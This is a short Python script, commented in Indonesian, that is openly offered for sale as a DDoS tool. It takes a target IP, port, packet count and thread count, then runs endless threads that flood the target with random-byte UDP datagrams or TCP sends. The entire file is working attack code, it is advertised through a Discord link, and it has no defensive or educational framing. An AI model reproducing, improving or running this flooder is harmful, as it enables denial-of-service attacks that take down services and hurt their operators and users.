#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by Ibnu Samp
#Join My T3Am : https://discord.gg/unitypride
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by IbnuSamp")
print("Jual 10K aja")
print("Minat? PM me ")
ip = str(input(" DdosAttackByIbnuSamp | Ip nya mas:"))
port = int(input(" DdosAttackByIbnuSamp | Port nya mas:"))
choice = str(input(" DdosAttackByIbnuSamp | gas ga mas?(y/n):"))
times = int(input(" DdosAttackByIbnuSamp | Packets:"))
threads = int(input(" DdosAttackByIbnuSamp | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | XalbadorX |")
		except:
			print("[!] | Anjai Down ga tuh |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" IbnuSamp nih bos!!!")
		except:
			s.close()
			print("[*] Down Hmmmm")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()